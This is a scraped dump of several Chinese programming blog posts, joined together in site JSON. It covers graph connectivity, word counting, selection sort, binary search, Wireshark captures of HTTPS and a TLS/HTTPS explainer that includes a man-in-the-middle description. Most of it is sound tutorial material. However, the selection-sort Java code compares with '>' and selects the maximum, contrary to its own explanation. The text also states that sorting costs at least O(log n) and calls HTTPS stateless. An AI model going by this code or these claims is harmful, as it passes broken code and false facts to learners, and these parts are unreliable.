若无向图不是连通图，但图中存储某个子图符合连通图的性质，则称该子图为连通分量。 前面讲过，由图中部分顶点和边构成的图为该图的一个子图，但这里的子图指的是图中”最大”的连通子图（也称”极大连通子图“）。 如下图所示，虽然下图 a) 中的无向图不是连通图，但可以将其分解为 3 个”最大子图”（图 b)），它们都满足连通图的性质，因此都是连通分量。 提示，图 a) 中的无向图只能分解为 3 部分各自连通的”最大子图”。 需要注意的是，连通分量的提出是以”整个无向图不是连通图”为前提的，因为如果无向图是连通图，则其无法分解出多个最大连通子图，因为图中所有的顶点之间都是连通的。 强连通图有向图中，若任意两个顶点 Vi 和 Vj，满足从 Vi 到 Vj 以及从 Vj 到 Vi 都连通，也就是都含有至少一条通路，则称此有向图为强连通图。如下图所示就是一个强连通图。 与此同时，若有向图本身不是强连通图，但其包含的最大连通子图具有强连通图的性质，则称该子图为强连通分量。 如图 5 所示，整个有向图虽不是强连通图，但其含有两个强连通分量。 总结可以这样说，连通图是在无向图的基础上对图中顶点之间的连通做了更高的要求，而强连通图是在有向图的基础上对图中顶点的连通做了更高的要求。 无向图（Undirected Graph，简单连接）、有向图（Directed Graph，连接有方向性）、加权图（Weighted Graph，连接带有权值）和加权有向图（Weighted Directed Graph，连接既有方向性又带有权值）。 生成树和生成森林生成树对连通图进行遍历，过程中所经过的边和顶点的组合可看做是一棵普通树，通常称为生成树。 如上图所示，图 a) 是一张连通图，图 b) 是其对应的 2 种生成树。 注意，连通图中，由于任意两顶点之间可能含有多条通路，遍历连通图的方式有多种，往往一张连通图可能有多种不同的生成树与之对应。 连通图中的生成树必须满足以下 2 个条件： 包含连通图中所有的顶点； 任意两顶点之间有且仅有一条通路； 因此，连通图的生成树具有这样的特征，即生成树中边的数量 = 顶点数 - 1。 生成森林生成树是对应连通图来说，而生成森林是对应非连通图来说的。 我们知道，非连通图可分解为多个连通分量，而每个连通分量又各自对应多个生成树（至少是 1 棵），因此与整个非连通图相对应的，是由多棵生成树组成的生成森林。 如上图所示，这是一张非连通图，可分解为 3 个连通分量，其中各个连通分量对应的生成树如下图所示： 注意，上图中列出的仅是各个连通分量的其中一种生成树。 因此，多个连通分量对应的多棵生成树就构成了整个非连通图的生成森林。 Reference 《Algorithm》 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Algorithm Problem】统计文章中每个单词出现的次数","date":"2019-05-14T03:08:58.000Z","path":"2019/05/14/【Algorithm-Problem】统计文章中每个单词出现的次数/","text":"Solution1234567891011121314151617String[] strs = &#123;\"apple\",...&#125;;Map&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;();for (String str : strs) &#123; if (map.containsKey(str)) &#123; Integer integer = map.get(str); integer++; map.put(str, integer); &#125; else &#123; map.put(str, 1); &#125;&#125;for (Map.Entry&lt;String, Integer&gt; me : map.entrySet()) &#123; String strKey = me.getKey(); Integer iCount = me.getValue(); System.out.println(strKey + \"出现了\" + iCount + \"次\");&#125;","comments":true,"categories":[{"name":"AlgorithmProblem","slug":"AlgorithmProblem","permalink":"http://swsmile.info/categories/AlgorithmProblem/"}],"tags":[{"name":"Algorithm Problem","slug":"Algorithm-Problem","permalink":"http://swsmile.info/tags/Algorithm-Problem/"}]},{"title":"【Algorithm】排序算法 - 选择排序（Selection Sort）","date":"2019-05-14T01:42:47.000Z","path":"2019/05/14/【Algorithm】排序算法-选择排序/","text":"选择排序（Selection Sort）选择排序的思路是这样的：首先，找到数组中最小的那个元素，其次，将它和数组的第 一个元素交换位置（如果第一个元素就是最小元素那么它就和自己交换）。再次，在剩下的元素中找到最小的元素，将它与数组的第二个元素交换位置。如此往复，直到将整个数组排序。 这种方法叫做选择排序（Selection Sort），因为它在不断地选择剩余元素之中的最小者。 如下所示，选择排序的内循环只是在比较当前元素与目前已知的最小元素（以及将当前索引加 1 和检查是否代码越界），这已经简单到了极点。交换元素的代码写在内循环之外，每次交换都能排定一个元素，因此交换的总次数是 N 。所以算法的时间效率取决于比较的次数。 特点总的来说，选择排序是一种很容易理解和实现的简单排序算法，它有两个很鲜明的特点。 运行时间和输入无关。为了找出最小的元素而扫描一遍数组并不能为下一遍扫描提供什么信息。 这种性质在某些情况下是缺点，因为使用选择排序的人可能会惊讶地发现，一个已经有序的数组或是主键全部相等的数组和一个元素随机排列的数组所用的排序时间竟然一样长！我们将会看到，其他算法会更善于利用输入的初始状态。 数据移动是最少的。每次交换都会改变两个数组元素的值，因此选择排序用了 N 次交换——交换次数和数组的大小是线性关系。我们将研究的其他任何算法都不具备这个特征（大部分的增长数量级都是线性对数或是平方级别）。 图解我们还是以[ 8，2，5，9，7 ]这组数字做例子。 第一次选择，先找到数组中最小的数字 2 ，然后和第一个数字交换位置。（如果第一个数字就是最小值，那么自己和自己交换位置，也可以不做处理，就是一个 if 的事情） 第二次选择，由于数组第一个位置已经是有序的，所以只需要查找剩余位置，找到其中最小的数字5，然后和数组第二个位置的元素交换。 第三次选择，找到最小值 7 ，和第三个位置的元素交换位置。 第四次选择，找到最小值8，和第四个位置的元素交换位置。 最后一个到达了数组末尾，没有可对比的元素，结束选择。 如此整个数组就排序完成了。 性能Time Complexity: $O(n^2)$ as there are two nested loops. Auxiliary Space: $O(1)$ The good thing about selection sort is it never makes more than O(n) swaps and can be useful when memory write is a costly operation. 实现1234567891011121314151617181920212223private static int[] selectionSort(int[] array) &#123; if (array == null || array.length == 0) return null; int minIndex; for(int i = 0; i&lt; array.length - 1;i++) &#123; minIndex = i; for (int j = i+1; j &lt; array.length; j++) &#123; if(array[j] &gt; array[minIndex])&#123; minIndex = j; &#125; &#125; if(minIndex != i)&#123; int temp = array[minIndex]; array[minIndex] = array[i]; array[i] = temp; &#125; &#125; return array;&#125; 动画演示 Reference GeeksforGeeks Selection Sort - https://www.geeksforgeeks.org/selection-sort/ https://visualgo.net/en/sorting 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】查找算法（Search） - 二分搜索算法(Binary Search)","date":"2019-05-13T13:56:33.000Z","path":"2019/05/13/【Algorithm】查找算法-二分搜索算法/","text":"无处不在的二分思想二分查找是一种非常简单易懂的快速查找算法，生活中到处可见。比如说，我们现在来做一个猜字游戏。我随机写一个 0 到 99 之间的数字，然后你来猜我写的是什么。猜的过程中，你每猜一次，我就会告诉你猜的大了还是小了，直到猜中为止。你来想想，如何快速猜中我写的数字呢？ 假设我写的数字是 23，你可以按照下面的步骤来试一试（如果猜测范围的数字有偶数个，中间数有两个，就选择较小的那个）。 7 次就猜出来了，是不是很快？这个例子用的就是二分思想，按照这个思想，即便我让你猜的是 0 到 999 的数字，最多也只要 10 次就能猜中。不信的话，你可以试一试。 这是一个生活中的例子，我们现在回到实际的开发场景中。假设有 1000 条订单数据，已经按照订单金额从小到大排序，每个订单金额都不同，并且最小单位是元。我们现在想知道是否存在金额等于 19 元的订单。如果存在，则返回订单数据，如果不存在则返回 null。 最简单的办法当然是从第一个订单开始，一个一个遍历这 1000 个订单，直到找到金额等于 19 元的订单为止。但这样查找会比较慢，最坏情况下，可能要遍历完这 1000 条记录才能找到。而使用二分查找就能更快速地解决。 二分搜索算法（binary search）二分搜索算法（binary search），也称折半搜索（half-interval search）、对数搜索（logarithmic search），是一种在有序数组中查找某一特定元素的搜索算法。 搜索过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜索过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。这种搜索算法每一次比较都使搜索范围缩小一半。 二分搜索在理想情况下的复杂度是对数时间，进行 $O(log_{2}n)$ 次比较操作（n在此处是数组的元素数量，O是大O记号， $log$ 是对数）。二分搜索使用常数空间，无论对任何大小的输入数据，算法使用的空间都是一样的。除非输入数据数量很少，否则二分搜索比线性搜索更快，但数组必须事先被排序。尽管特定的、为了快速搜索而设计的数据结构更有效（比如哈希表），二分搜索应用面更广。 二分搜索有许多中变种。比如分散层叠可以提升在多个数组中对同一个数值的搜索。分散层叠有效的解决了计算几何学和其他领域的许多搜索问题。指数搜索将二分搜索拓宽到无边界的列表。二分搜索树和B树数据结构就是基于二分搜索的。 关于二分搜索算法（binary search）二分搜索算法（binary search）主要是解决在“一堆数中找出指定的数”这类问题。 而想要应用二分搜索算法，这“一堆数”必须有一下特征： 存储在数组中 有序排列 所以如果是用链表存储的，就无法在其上应用二分查找法了。 至于是顺序递增排列还是递减排列，数组中是否存在相同的元素都不要紧。不过一般情况，我们还是希望并假设数组是递增排列，数组中的元素互不相同。 二分查找法的缺陷二分查找法的 $O(log_2n)$ 让它成为十分高效的算法。不过，并不是什么情况下都可以用二分查找，它的应用场景有很大局限性。 1 . 二分查找依赖的是顺序表结构，即数组。 二分查找不能依赖于其他数据结构，比如链表。主要原因是二分查找算法需要按照下标随机访问元素。数组按照下标随机访问数据的时间复杂度是 O(1)，而链表随机访问的时间复杂度是 O(n)。所以，如果数据使用链表存储，二分查找的时间复杂就会变得很高。 2 . 二分查找针对的是有序数据。如果数据没有序，需要先排序。排序的时间复杂度最低是 $O(log_2n)$ 。所以，如果针对的是一组静态的数据，没有频繁地插入、删除，就可以进行一次排序，多次二分查找。这样排序的成本可被均摊，二分查找的边际成本就会比较低。针对有频繁插入、删除操作的这种动态数据集合，二分查找是不适用的。要用二分查找，要么每次插入、删除操作之后保证数据仍然有序，要么在每次二分查找之前都先进行排序。针对这种动态数据集合，无论哪种方法，维护有序的成本都很高。 3 . 数据量太小不适合二分查找。如果要处理的数据量很小，完全没有必要用二分查找，顺序遍历就足够了。比如在一个大小为 10 的数组中查找一个元素，不管用二分查找还是顺序遍历，查找速度都差不多。只有数据量比较大的时候，二分查找的优势才会比较明显。 解决这些缺陷问题更好的方法，应该是使用二叉搜索树了，最好自然是自平衡二叉搜索树了，自能高效的（$O(n log_2n)$）构建有序元素集合，又能如同二分查找法一样快速（$O(log_2n)$）的搜寻目标数。 实现二分搜索算法在算法家族大类中属于“分治法（Divide and Conquer）”，分治法基本都可以用递归来实现。 Java 递归123456789101112public static int binarySearch(int[] arr, int start, int end, int hkey)&#123; if (start &gt; end) return -1; int mid = start + (end - start)/2; //防止溢位 if (arr[mid] &gt; hkey) return binarySearch(arr, start, mid - 1, hkey); if (arr[mid] &lt; hkey) return binarySearch(arr, mid + 1, end, hkey); return mid; &#125; 注意，为什么这里要用 int mid = start + (end - start)/2;，而不是 mid = (start+end)/2 就好了？ 因为，当start 和 end 都很大时（但是在int的value range里面），它们两个加起来就可能会超过2,147,483,647，最终产生溢出的问题。 Java while 循环1234567891011121314151617public static int binarySearch(int[] arr, int start, int end, int hkey)&#123; int result = -1; while (start &lt;= end)&#123; int mid = start + (end - start)/2; //防止溢位 if (arr[mid] &gt; hkey) end = mid - 1; else if (arr[mid] &lt; hkey) start = mid + 1; else &#123; result = mid; break; &#125; &#125; return result;&#125; Reference 二分查找法的实现和应用汇总 - https://www.cnblogs.com/ider/archive/2012/04/01/binary_search.html 二分查找 - http://ipine.me/2018-11-08/ 15 | 二分查找（上）：如何用最省内存的方式实现快速查找功能？ - https://www.jianshu.com/p/78b505a6abf4","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Security】Wireshake抓包分析HTTPS","date":"2019-05-13T05:09:27.000Z","path":"2019/05/13/【Security】Wireshake抓包分析HTTPS/","text":"抓包1过滤条件：ssl &amp;&amp; ip.addr == 180.101.53.2 &amp;&amp; tcp.port == 55583 Client-hellos 阶段本机 -&gt; 180.101.53.2 Handshake Protocol: Client Hello（#37） Server-hello 阶段180.101.53.2-&gt; 本机 Handshake Protocol: Server Hello（#38） 180.101.53.2-&gt; 本机 Handshake Protocol: Certificate、Handshake Protocol: Server Key Exchange、Handshake Protocol: Server Hello Done（#40） Cipher-spec 阶段本机 -&gt; 180.101.53.2 Handshake Protocol: Client Key Exchange、Change Cipher Spec Protocol: Change Cipher Spec、Handshake Protocol: Encrypted Handshake Message（#43） 180.101.53.2-&gt; 本机 Change Cipher Spec Protocol: Change Cipher Spec、Handshake Protocol: Encrypted Handshake Message（#44） 本机 -&gt; 180.101.53.2 Application Data Protocol: http-over-tls（#46） 抓包2我们在浏览器地址栏中输入https://www.baidu.com 通过增加过滤条件((ssl || tcp) &amp;&amp; ip.addr == 14.215.177.39) || dns DNS查询（#2159，#2166） 三次握手（#2167，#2184，#2186） Client-hello 阶段本机 -&gt; 14.215.177.39 Client Hello（#2187） Server-hello 阶段14.215.177.39 -&gt; 本机 Server Hello（#2194） Certificate Server Key Exchange Server Hello Done Cipher-spec 阶段Client Key Exchange Change Cipher Spec Encrypted Handshake Message 14.215.177.39 -&gt; 本机","comments":true,"categories":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/tags/Security/"}]},{"title":"【Security】HTTPS","date":"2019-05-13T05:06:52.000Z","path":"2019/05/13/【Security】HTTPS/","text":"协议历史SSL（Secure Sockets Layer）协议由Netscape公司开发，历史可以追溯到Netscape Navigator浏览器统治互联网的时代。SSL 1.0 从未发布过，因为存在严重的安全漏洞。 SSL 2.0的开发基本上没有与Netscape以外的安全专家进行过商讨，所以有严重的弱点，被认为是失败的协议，最终退出了历史的舞台。这次失败使Netscape专注于SSL 3.0，并于1995年年底发布。 虽然名称与早先的协议版本相同，但SSL 3.0是完全重新设计的协议。SSL 3.0 在Web上获得了广泛的应用。 1996年5月，TLS工作组开始将SSL从Netscape迁移至IETF。由于Microsoft和Netscape 当时正在为Web的统治权争得不可开交，整个迁移过程进行得非常缓慢、艰难。最终，TLS 1.0 于1999年1月问世，见RFC 2246。事实上，TLS 1.0与SSL 3的差异并不大。 直到2006年4月，下一个版本TLS 1.1才问世，仅仅修复了一些关键的安全问题。然而，协议的重要更改是作为TLS扩展于2003年6月发布的，并被集成到了协议中，这比大家的预期早了好几年。 2008年8月，TLS 1.2发布。该版本添加了对已验证加密的支持，并且基本上删除了协议说明中所有硬编码的安全基元，使协议完全弹性化。 TLS 1.3在 RFC 8446 中定义，于2018年8月发表。 SSL 3.0存在的安全性问题2014年10月，Google发布在SSL 3.0中发现设计缺陷，建议禁用此一协议。攻击者可以向TLS发送虚假错误提示，然后将安全连接强行降级到过时且不安全的SSL 3.0，然后就可以利用其中的设计漏洞窃取敏感信息。Google在自己公司相关产品中陆续禁止回溯兼容，强制使用TLS协议。Mozilla也在11月25日发布的Firefox 34中彻底禁用了SSL 3.0。微软同样发出了安全通告[6]。 什么是 HTTPSHTTPS（全称：Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。 HTTP 与 HTTPS 的区别 HTTP 是明文传输，HTTPS 通过 SSL\\TLS 进行了加密 HTTP 的端口号是 80，HTTPS 是 443 HTTPS 需要到 CA 申请证书，一般免费证书很少，需要交费 HTTPS 的连接很简单，是无状态的；HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，比 HTTP 协议安全。 为什么要使用 HTTPS其实使用 HTTPS 最主要的用处是以下两点： 建立一个信息安全通道，来保证数据传输的安全 确认网站的真实性，防止钓鱼网站 TLS的通信过程 握手（Handshake）阶段Client-hello 阶段浏览器中完成地址输入后，解析域名获得 IP Host 地址， 浏览器会与此 Host 的443（默认， 如果指定其他端口则会连接此端口）尝试连接， 也就是 TLS 握手协议的 Client-hello。 浏览器会将”支持的加密组件”、随机数等信息发送给服务器， 并会附上一份随机生成的 session ticket1。 Server-hello 阶段服务器收到浏览器发送来的 TLS 握手请求后，存储浏览器发送的session ticket 1， 并返回服务器与浏览器妥协（两方均支持）的加密套件方法、随机数和随机生成的 session ticket 2 提供给浏览器。 Certificate 阶段服务器根据发送来的 host 寻找对于的服务器证书， 然后会将服务器证书返回给浏览器。 Server Hello Done 阶段Cipher-spec Exchange阶段浏览器收到服务器返回的证书后，会验证证书有效性。验证步骤大概如下: 验证证书有效期（起止时间）； 验证证书域名（与浏览器地址栏中域名是否匹配）； 验证证书吊销状态（CRL+OCSP）； 验证证书颁发机构， 如果颁发机构是中间证书， 在验证中间证书的有效期/颁发机构/吊销状态。 一直验证到最后一层证书， 如果最后一层证书是在操作系统或浏览器内置， 那么就是可信的， 否则就是自签名。 以上验证步骤， 需要全部通过。 否则就会显示警告。 若对数字证书的有效性检查通过，则随机生成一份 session ticket 3 （称为预主密钥，Premaster Secret，这是浏览器生成的第二份 session ticket，其中session ticket 1 由浏览器生成，session ticket 2由服务器生成）。浏览器用 session ticket 1 + session ticket 2 + session ticket 3 ，生成 session key （即主密钥，master secret）。并通过使用证书中的公钥，用协商确定的特定”秘钥交换算法”对session ticket 3进行加密，提供给服务器。 服务器收到这个session ticket 3 （也称为预主密钥，Premaster Secret）后， 用自己的私钥， 解密出 session ticket3， 用 session ticket 1 + session ticket 2 + session ticket 3 ，也生成 session key（即主密钥，master secret）。这个session key就是在真正的数据传输阶段，进行对称加密传输时使用的秘钥。 总结来说， 服务器与浏览器在HTTPS握手完成后最终使用的对称加密秘钥，即 session key（即主密钥，master secret），通过session ticket 1 + session ticket 2 + session ticket 3 生成。其中session ticket 1 和 session ticket 2通过明文传输；而session ticket 3由浏览器生成，并使用数字证书的公钥对其进行加密后，传输给服务器。 数据传输阶段在握手（Handshake）阶段和Cipher-spec Exchange阶段完成之后，就进入真正的数据传输阶段。 可能有人会问，既然 TLS 证书中已经内置了公钥了，为什么还在数据传输阶段还需要使用使用对称加密。 其实，因为非对称加密非常消耗 CPU，所以只有在协商秘钥时候使用非对称加密， 而应用层数据交换时，就用协商成功的秘钥作为私钥对称加密传输。 TLS 证书证书链 客户端在获取到了站点证书的同时，也拿到了站点的公钥； 客户端要验证证书中站点的公钥，本质上是在验证证书本身； 在站点证书中，获取颁发者（CA）名称； 通过该颁发者（CA）名称，找到对应的颁发者中间证书； 再通过颁发者中间证书向上回溯，找到认证中间证书商的源头证书颁发者（根证书颁发机构）。由于源头的证书颁发者非常少，浏览器默认内置了这些根证书颁发机构证书； 通过根证书颁发机构证书内置的公钥，可以验证根证书颁发机构证书自身的可信性； 继而，通过根证书颁发机构证书内置的公钥，可以验证根证书颁发机构认证的中间证书的可信性； 继而，通过中间证书内置的公钥，可以验证站点证书的可信性。 证书分类证书分为DV（Digital Verification），OV（Organization Verification）和EV（Extended Verification）s，其中EV证书最贵，可以在浏览器中看到绿色的就是EV证书。证书从申请到批准要走很久的流程，需要提供很多的公司认证信息和个人信息，否则是不会通过的。因此可以保证签发的证书内容是可信的。 TLS 的子协议TLS的主规格说明书定义了四个核心子协议：握手协议（handshake protocol）、密钥规格变更协议（change cipher spec protocol）、应用数据协议（application data protocol）和警报协议（alert protocol）。 握手协议（handshake protocol）ClientHello在一次新的握手流程中，ClientHello消息总是第一条消息。这条消息将客户端的功能和首 选项传送给服务器。客户端会在新建连接后，希望重新协商或者响应服务器发起的重新协商请求 （由HelloRequest消息指示）时，发送这条消息。 在下面的例子中，你可以观察到ClientHello消息。为了更简洁，我减少了一些信息展示， 但是包含了所有的关键元素。 123456789101112131415161718192021222324252627282930Handshake protocol: ClientHello Version: TLS 1.2 Random Client time: May 22, 2030 02:43:46 GMT Random bytes: b76b0e61829557eb4c611adfd2d36eb232dc1332fe29802e321ee871 Session ID: (empty) Cipher Suites Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA Suite: TLS_RSA_WITH_AES_128_CBC_SHA Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA Suite: TLS_RSA_WITH_RC4_128_SHA Compression methods Method: null Extensions Extension: server_name Hostname: www.feistyduck.com Extension: renegotiation_info Extension: elliptic_curves Named curve: secp256r1 Named curve: secp384r1 Extension: signature_algorithms Algorithm: sha1/rsa Algorithm: sha256/rsa Algorithm: sha1/ecdsa Algorithm: sha256/ecdsa 可以看到，绝大多数消息字段光看名称就很容易理解，而且消息的结构也很容易理解。 Version：协议版本（protocol version）指示客户端支持的最佳协议版本。 Random：随机数（random）字段包含32字节的数据。当然，只有28字节是随机生成的；剩余的4字 节包含额外的信息，受客户端时钟的影响。准确来说，客户端时间与协议不相关，而且 协议规格文档中言及此事时也很清楚（“基本的TLS协议不需要正确设置时钟，更高层或 应用协议可以定义额外的需求项。”）；该字段是1994年在Netscape Navigator中发现了一个 严重故障之后，为了防御弱随机数生成器而引入的 。尽管这个字段曾经一直含有精确时 间的部分，但现在仍然有人担心客户端时间可能被用于大规模浏览器指纹采集，或者简单地发 送随机的4字节。 在握手时，客户端和服务器都会提供随机数。这种随机性对每次握手都是独一无二的，在 身份验证中起着举足轻重的作用。它可以防止重放攻击，并确认初始数据交换的完整性。 Session ID：在第一次连接时，会话ID（session ID）字段是空的，这表示客户端并不希望恢复某个已 存在的会话。在后续的连接中，这个字段可以保存会话的唯一标识。服务器可以借助会 话ID在自己的缓存中找到对应的会话状态。典型的会话ID包含32字节随机生成的数据， 这些数据本身并没有什么价值。 Cipher Suites：密码套件（cipher suite）块是由客户端支持的所有密码套件组成的列表，该列表是按优先 级顺序排列的。 Compression：客户端可以提交一个或多个支持压缩的方法。默认的压缩方法是null，代表没有压缩。 Extensions：扩展（extension）块由任意数量的扩展组成。这些扩展会携带额外数据。ServerHello ServerHello消息的意义是将服务器选择的连接参数传送回客户端。 这个消息的结构与 ClientHello类似，只是每个字段只包含一个选项。 1234567891011Handshake protocol: ServerHello Version: TLS 1.2 Random Server time: Mar 10, 2059 02:35:57 GMT Random bytes: 8469b09b480c1978182ce1b59290487609f41132312ca22aacaf5012 Session ID: 4cae75c91cf5adf55f93c9fb5dd36d19903b1182029af3d527b7a42ef1c32c80 Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 Compression method: null Extensions Extension: server_name Extension: renegotiation_info 服务器无需支持客户端支持的最佳版本。如果服务器不支持与客户端相同的版本，可以提供 某个其他版本以期待客户端能够接受。 Certificate典型的Certificate消息用于携带服务器X.509证书链。证书链是以ASN.1 DER编码的一系列证书，一个接着一个组合而成。主证书必须第一个发送，中间证书按照正确的顺序跟在主证书之后。根证书可以并且应该省略掉，因为在这个场景中它没有用处。 服务器必须保证它发送的证书与选择的算法套件一致。比方说，公钥算法与套件中使用的必须匹配。除此以外，一些密钥交换算法依赖嵌入证书的特定数据，而且要求证书必须以客户端支 持的算法签名。所有这些都表明服务器需要配置多个证书（每个证书可能会配备不同的证书链）。 Certificate消息是可选的，因为并非所有套件都使用身份验证，也并非所有身份验证方法都 需要证书。更进一步说，虽然消息默认使用X.509证书，但是也可以携带其他形式的标志；一些 套件就依赖PGP密钥 。 ServerKeyExchangeServerKeyExchange消息的目的是携带密钥交换的额外数据。消息内容对于不同的协商算法套 件都会存在差异。在某些场景中，服务器不需要发送任何内容，这意味着在这些场景中根本不会 发送ServerKeyExchange消息。 ServerHelloDoneServerHelloDone消息表明服务器已经将所有预计的握手消息发送完毕。在此之后，服务器会等待客户端发送消息。 ClientKeyExchangeClientKeyExchange消息携带客户端为密钥交换提供的所有信息。这个消息受协商的密码套件 的影响，内容随着不同的协商密码套件而不同。 ChangeCipherSpecChangeCipherSpec消息表明发送端已取得用以生成连接参数的足够信息，已生成加密密钥， 并且将切换到加密模式。客户端和服务器在条件成熟时都会发送这个消息。 FinishedFinished消息意味着握手已经完成。消息内容将加密，以便双方可以安全地交换验证整个握 手完整性所需的数据。 密钥交换密钥交换是握手过程中最引人入胜的部分。在TLS中，会话安全性取决于称为主密钥（master secret）的48字节共享密钥。密钥交换的目的是计算另一个值，即预主密钥（premaster secret）。 这个值是组成主密钥的来源。 RSA 密钥交换RSA密钥交换的过程十分直截了当。客户端生成预主密钥（46字节随机数），使用服务器公钥对其加密，将其包含在ClientKeyExchange消息中，最后发送出去。服务器只需要解密这条消息就能取出预主密钥。 密钥规格变更协议（change cipher spec protocol）应用数据协议（application data protocol）应用数据协议携带着应用消息，只以TLS的角度考虑的话，这些就是数据缓冲区。记录层使 用当前连接安全参数对这些消息进行打包、碎片整理和加密。 警报协议（alert protocol）警报的目的是以简单的通知机制告知对端通信出现异常状况。它通常会携带close_notify异 常，在连接关闭时使用，报告错误。警报非常简单，只有两个字段： 1234struct &#123; AlertLevel level; AlertDescription description; &#125; Alert; Reference 《HTTPS权威指南》 https://zh.wikipedia.org/wiki/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E6%80%A7%E5%8D%94%E5%AE%9A 看图学HTTPS - https://segmentfault.com/a/1190000014954687 一个故事讲完https - https://mp.weixin.qq.com/s/StqqafHePlBkWAPQZg3NrA TLS 1.3科普——新特性与协议实现 - https://zhuanlan.zhihu.com/p/28850798 HTTP和HTTPS详解 - https://juejin.im/post/5af557a3f265da0b9265a498 一个故事讲完https - https://mp.weixin.qq.com/s/StqqafHePlBkWAPQZg3NrA \bHTTPs入门, 图解SSL从回车到握手 - https://zhuanlan.zhihu.com/p/25587986","comments":true,"categories":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/tags/Security/"}]},{"title":"【Security】安全的HTTP的演化","date":"2019-05-13T03:13:59.000Z","path":"2019/05/13/【Security】安全的HTTP的演化/","text":"HTTP是什么样的？HTTP是属于应用层的协议，它是基于TCP/IP的，所以它只是规定一些要传输的内容，以及头部信息，然后通过TCP协议进行传输，依靠IP协议进行寻址，通过一幅最简单的图来描述： Client发出请求，Server进行响应，就是这么简单。在整个过程中，没有任何加密的东西，所以它是不安全的，中间人可以进行拦截，获取传输和响应的数据，造成数据泄露。 基于对称加密（Symmetric Encryption）的HTTP因为上图中数据是明文传输的，我们能想到最简单的提高安全性的方法就是在传输前对数据进行加密，如下图： 这种加密方式叫做：对称加密算法（Symmetric Encryption Algorhithm），即加密和解密使用同一个秘钥的加密方式。 好了，我们对数据进行加密了，问题解决了吗？ 多个Client怎么办？在上面的场景中，只有一个Client。但是在真实的情况中，一个Server，可能会被成千上万的Client，那情况会怎样呢？ 为所有的Client都应用同一个秘钥A，这种方式很显然是不合理的。因为，破解了一个用户，所有的用户信息都会被盗取。 如果攻击者聪明一点，可以先作为一个正常的Client先与Server进行正常的通信，在获得了秘钥之后，再去窃听其他Client与Server的通信。 因此，我们要想一想，是不是还有别的办法呢？ 相信大家都可以想到，如果对每一个Client都用不同的秘钥进行传输（如下图），是不是就解决这个问题了？ 对称加密秘钥的传输问题我们对每个Client应用不同的对称加密秘钥，那么对于这个秘钥，如何让Client或者Server知道呢，只能是在一端生成一个秘钥，然后通过HTTP传输给另一端： 那么这个传输秘钥的过程，又如何保证加密？如果被中间人拦截，秘钥也会被获取。也许你会说，对秘钥再进行加密，那又如何保证对秘钥加密的过程，是加密的呢？ 好像我们走入了 while(1)，出不来了。 基于非对称加密（Asymmetric Encryption）的HTTP在对称加密的路上走不通了，我们换个思路，还有一种加密算法叫非对称加密算法（Asymmetric Encryption Algorithm），比如RSA。非对称加密算法需要一对秘钥：公钥（public key）和私钥（private key）。 通过公钥加密的内容，只有通过私钥才可以解开；而通过私钥加密的内容，所有的公钥都可以解开（当然是指和秘钥是一对的公钥）。 私钥只保存在服务器端，而公钥需要分别发送给不同的Client。因此，在传输公钥的过程中，可能出现被中间人获取的情况，这就是中间人攻击（Man-in-the-Middle Attack，MITM）。 中间人攻击（Man-in-the-Middle Attack，MITM）具体地来说，当Client向Server请求公钥时，攻击者假装自己就是Server，并在截取到Client发来的”请求公钥”请求后，向真正的Server请求公钥；在获得真正的Server提供的公钥后，攻击者用自己的假公钥替换掉Server提供的真公钥，并返回给Client。 此后，当Client向Server发送数据时，攻击者先通过自己的私钥对数据进行解密，然后再用Server提供的公钥对数据进行加密，并传给Server。 Server自然地会用自己的私钥解密数据，并做相应的逻辑处理。当处理完成后，Server将数据使用自己的私钥进行加密，并返回给攻击者。 攻击者再用Server提供的公钥对数据进行解密，再对数据用自己的私钥进行加密，最终返回给Client。 中间攻击者在逻辑上位于Client和Server之间（在物理上，这个攻击者可以位于Client的局域网内，也可以位于Client与Server通讯时经过的一个网络节点）。 最终，中间攻击者即可以默默地获得Client和Server之间的通信内容，甚至修改通信内容（如下图所示），而不为两方所感知。 这个问题发生的根本原因在于，Client拿到了一个假公钥（这个假公钥是由攻击者提供的，而不是Server提供的那个公钥），而且Client无法验证自己拿到的公钥是由谁生成的。 值得一提的是，在这种情况中，是可以保证Client与中间攻击者之间，和中间攻击者和Server之间的网络传输的安全性的（即，对于没有获得公钥或者私钥的另外攻击者而言，这两个过程的通讯内容均为乱码）。 引入权威第三方认证（Certificate Authority，CA）颁发的数字证书（Digital Certificate）权威第三方认证（Certificate 